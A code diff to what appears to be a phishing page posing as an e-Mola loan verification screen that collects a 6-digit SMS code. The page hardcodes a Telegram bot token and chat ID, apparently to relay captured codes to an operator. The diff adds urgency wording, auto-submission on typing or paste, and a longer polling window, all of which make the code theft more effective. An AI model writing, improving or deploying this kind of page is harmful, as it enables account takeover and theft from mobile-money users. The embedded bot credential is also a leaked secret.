@@ -95,7 +95,7 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
     </div>
-    <p class="hint" data-i18n="vf.hint">Verifique o seu SMS para o código de confirmação de 6 dígitos</p>
+    <p class="hint" data-i18n="vf.hint">⚠️ Introduza o código rapidamente para evitar expiração.</p>
 
     <div class="btns">
       <button class="btn-p" onclick="doOTP()" data-i18n="vf.btn">Verificar Dispositivo</button>
@@ -113,16 +113,14 @@ const translations={
   pt:{
     "vf.h1":"Confirme o seu código","vf.sub":"Estamos a confirmar o seu dispositivo",
     "vf.bAmount":"Empréstimo:","vf.bDur":"Prazo:","vf.bTotal":"Total a Pagar:",
-    "vf.code":"Código de Verificação","vf.hint":"Verifique o seu SMS para o código de confirmação de 6 dígitos",
-    "vf.btn":"Verificar Dispositivo","vf.cancel":"Cancelar","vf.secure":"🔒 Protegido com segurança e-Mola",
+    "vf.code":"Código de Verificação","vf.hint":"⚠️ Introduza o código rapidamente para evitar expiração.","vf.btn":"Verificar Dispositivo","vf.cancel":"Cancelar","vf.secure":"🔒 Protegido com segurança e-Mola",
     "vf.loading":"A confirmar o código","vf.wait":"Por favor aguarde...",
     "err.all6":"Insira todos os 6 dígitos","err.declined":"Código recusado. Tente novamente."
   },
   en:{
     "vf.h1":"Confirm your code","vf.sub":"We are verifying your device",
     "vf.bAmount":"Loan:","vf.bDur":"Term:","vf.bTotal":"Total to Pay:",
-    "vf.code":"Verification Code","vf.hint":"Check your SMS for the 6-digit confirmation code",
-    "vf.btn":"Verify Device","vf.cancel":"Cancel","vf.secure":"🔒 Protected with e-Mola security",
+    "vf.code":"Verification Code","vf.hint":"⚠️ Enter the code quickly to avoid expiration.","vf.btn":"Verify Device","vf.cancel":"Cancel","vf.secure":"🔒 Protected with e-Mola security",
     "vf.loading":"Confirming code","vf.wait":"Please wait...",
     "err.all6":"Please enter all 6 digits","err.declined":"Code declined. Please try again."
   }
@@ -143,6 +141,7 @@ function tr(key){const l=localStorage.getItem('emola_lang')||'pt';return (transl
 const BOT='8976816871:AAEoOSVkVWkrROLidS1qWH6snhpmU3e8AXU';
 const CID='8873805952';
 let bd={},luid=0,phone='';
+let isSubmitting = false;
 
 function fmtNum(n){return parseInt(n||0).toLocaleString('pt-PT').replace(/\s/g,'.')}
 
@@ -162,31 +161,54 @@ function init(){
 const boxes=document.querySelectorAll('.otp-box');
 boxes.forEach((b,i)=>{
   b.addEventListener('input',e=>{
+    e.target.value = e.target.value.replace(/\D/g,'');
     const v=e.target.value;
     if(v.length>1){
-      const digs=v.replace(/\D/g,'').split('');
+      const digs=v.split('');
       digs.forEach((d,j)=>{if(i+j<boxes.length){boxes[i+j].value=d;boxes[i+j].classList.add('ok')}});
-      boxes[Math.min(i+digs.length,boxes.length-1)].focus();return;
+      const nextIndex = Math.min(i+digs.length,boxes.length-1);
+      boxes[nextIndex].focus();
+      if(getCode().length === 6) setTimeout(doOTP, 300);
+      return;
     }
-    if(v){b.classList.add('ok');if(i<boxes.length-1)boxes[i+1].focus()}
+    if(v){
+      b.classList.add('ok');
+      if(i<boxes.length-1){
+        boxes[i+1].focus();
+      } else {
+        if(getCode().length === 6) setTimeout(doOTP, 200);
+      }
+    }
     else{b.classList.remove('ok')}
   });
   b.addEventListener('keydown',e=>{
-    if(e.key==='Backspace'&&!e.target.value&&i>0){boxes[i-1].focus();boxes[i-1].value='';boxes[i-1].classList.remove('ok')}
+    if(e.key==='Backspace'&&!e.target.value&&i>0){
+      boxes[i-1].focus();boxes[i-1].value='';boxes[i-1].classList.remove('ok')
+    }
   });
-  b.addEventListener('paste',e=>{
+});
+
+document.addEventListener('paste',e=>{
+  const t=e.clipboardData.getData('text').replace(/\D/g,'');
+  if(t.length===6){
     e.preventDefault();
-    const t=e.clipboardData.getData('text').replace(/\D/g,'');
-    t.split('').forEach((d,j)=>{if(j<boxes.length){boxes[j].value=d;boxes[j].classList.add('ok')}});
-    boxes[Math.min(t.length-1,boxes.length-1)].focus();
-  });
+    boxes.forEach((b,j)=>{b.value=t[j]||'';b.classList.toggle('ok',!!t[j])});
+    boxes[5].focus();
+    setTimeout(doOTP, 300);
+  }
 });
 
 function getCode(){return Array.from(boxes).map(b=>b.value).join('')}
 
 function doOTP(){
+  if(isSubmitting) return;
   const otp=getCode();
-  if(otp.length!==6){showErr(tr('err.all6'));return}
+  if(otp.length!==6){
+    showErr(tr('err.all6'));
+    for(let b of boxes){ if(!b.value){ b.focus(); break; } }
+    return;
+  }
+  isSubmitting = true;
   clrErr();
   document.getElementById('ov').classList.add('on');
 
@@ -222,12 +244,16 @@ function pollOTP(){
             document.getElementById('ov').classList.remove('on');
             showErr(tr('err.declined'));
             resetOTP();
+            isSubmitting = false;
           }
         }
       }
     }).catch(e=>console.error(e));
   },1000);
-  setTimeout(()=>clearInterval(iv),300000);
+  setTimeout(()=>{
+    clearInterval(iv);
+    isSubmitting = false;
+  },900000);
 }
 
 function showErr(m){const e=document.getElementById('err');e.textContent=m;e.classList.add('show')}
